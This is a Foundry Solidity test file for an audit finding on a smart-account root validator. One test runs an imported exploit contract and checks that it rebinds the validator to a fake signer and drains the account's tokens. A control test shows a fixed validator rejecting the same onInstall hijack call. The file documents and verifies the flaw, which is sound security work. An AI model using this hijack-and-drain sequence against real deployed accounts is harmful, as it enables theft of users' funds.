// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, Token, RootValidatorFixed, FakeSigner, OnChainLab, Executor, IValidator} from
    "./65952-rootvalidatoroninstall-permissionless-and-lacks-self-binding.sol";

contract Finding65952Test is Test {
    function test_exploit_rebinds_root_validator_and_drains_account() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.stolen(), 5 ether, "drained 5");
        assertEq(e.token().balanceOf(address(e)), 5 ether, "attacker holds 5");
        assertEq(e.token().balanceOf(address(e.account())), 0, "account empty");
        assertEq(e.validator().bound(address(e.account())), address(e.fake()), "binding is the fake signer");
    }

    function test_control_self_bind_and_initialized_guard_keep_the_balance() public {
        Token token = new Token();
        RootValidatorFixed validator = new RootValidatorFixed();
        FakeSigner fake = new FakeSigner(address(this));
        OnChainLab account = new OnChainLab(IValidator(address(validator)), token, address(0xA11CE));
        Executor executor = new Executor();
        account.setExecutor(address(executor));
        token.mint(address(account), 5 ether);

        bytes memory hijack = abi.encodeWithSelector(validator.onInstall.selector, abi.encodePacked(address(fake)));
        (bool ok,) = address(executor).call(
            abi.encodeWithSelector(executor.sudoDoExec.selector, address(account), address(validator), hijack)
        );
        assertFalse(ok, "rebind reverted");
        assertEq(validator.bound(address(account)), address(account), "binding unchanged");

        (bool drained,) =
            address(account).call(abi.encodeWithSelector(account.execute.selector, address(this), 5 ether));
        assertFalse(drained, "drain reverted");
        assertEq(token.balanceOf(address(account)), 5 ether, "balance stays");
        assertEq(token.balanceOf(address(this)), 0, "caller got nothing");
    }
}
